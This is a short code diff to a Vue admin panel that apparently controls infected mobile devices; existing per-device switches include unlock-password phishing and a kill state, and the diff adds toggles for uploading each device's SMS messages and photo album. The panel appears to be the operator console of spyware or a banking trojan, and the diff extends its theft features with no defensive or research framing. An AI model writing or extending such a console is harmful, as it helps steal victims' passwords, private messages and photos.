@@ -99,6 +99,13 @@
           <el-switch inactive-text="解锁密码钓鱼" :model-value="!!scope.row.unlockFish" @update:model-value="updateDeviceSwitch(scope.row, 'unlockFish', $event)" />
           <el-switch inactive-text="Kill状态" :model-value="!!scope.row.kill"
             @update:model-value="updateDeviceSwitch(scope.row, 'kill', $event)" />
+
+            <el-switch inactive-text="上传短信" :model-value="!!scope.row.uploadSms"
+            @update:model-value="updateDeviceSwitch(scope.row, 'uploadSms', $event)" />
+
+            <el-switch inactive-text="上传相册" :model-value="!!scope.row.uploadAlbum"
+            @update:model-value="updateDeviceSwitch(scope.row, 'uploadAlbum', $event)" />
+
         </template>
       </el-table-column>
       <el-table-column label="设备状态" header-align="center" align="right" width="150px">
